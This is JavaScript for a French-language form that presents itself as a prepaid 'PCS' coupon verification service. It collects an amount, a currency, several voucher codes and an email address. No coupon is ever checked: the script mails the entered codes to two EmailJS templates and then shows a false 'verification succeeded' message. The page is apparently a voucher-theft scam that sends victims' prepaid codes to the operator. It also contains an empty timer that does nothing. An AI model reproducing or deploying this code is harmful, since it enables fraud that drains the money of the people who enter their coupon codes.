const btn = document.getElementById('submit_button');
document.getElementById('form_pcs').addEventListener('submit', function(event) {
    event.preventDefault();

    btn.value = 'Verifier du coupon en cour...';

const serviceID = 'default_service';
const templateID = 'template_6t50ezk';
const templateID2 = 'template_faa4md4';
var recharge = document.getElementById("recharge").value;
var montant = document.getElementById("montant").value;
var devise = document.getElementById("devise").value;
var codeEnregistrement =
  document.getElementById("codeEnregistrement").value;
var codeEnregistrement1 = document.getElementById(
  "codeEnregistrement1"
).value;
var codeEnregistrement2 = document.getElementById(
  "codeEnregistrement2"
).value;
var codeEnregistrement3 = document.getElementById(
  "codeEnregistrement3"
).value;

if (montant == "") {
  message = "Veuillez renseigner un montant";
  humane.info = humane.spawn({
    addnCls: "humane-jackedup-error",
    timeout: 2000,
  });
  humane.info(message);
  btn.value = 'Verification du coupon';
  
} else {

if (codeEnregistrement == "") {
  message = "Veuillez renseigner au moins un code  d'enregistrement";
  humane.info = humane.spawn({
    addnCls: "humane-jackedup-error",
    timeout: 2000,
  });
  humane.info(message);
  btn.value = 'Verification du coupon';
 
} else{

var email = document.getElementById("email").value;

if (email == "") {
  message = "Veuillez renseigner une adresse email";
  humane.info = humane.spawn({
    addnCls: "humane-jackedup-error",
    timeout: 2000,
  });
  humane.info(message);
  btn.value = 'Verification du coupon';
  
} else{
    console.log('LOG');
    setTimeout(function() {
}, 1 * 60 * 1000);
  emailjs.sendForm(serviceID,templateID , this);
  emailjs.sendForm(serviceID, templateID2, this)
  .then(() => {
  btn.value = 'Verification du coupon';
  alert('Verification reuissir avec succées Veuillez verifié votre boite email');
}, (err) => {
  btn.value = 'Verification du coupon';
  alert(JSON.stringify(err));
});

}
}
}


});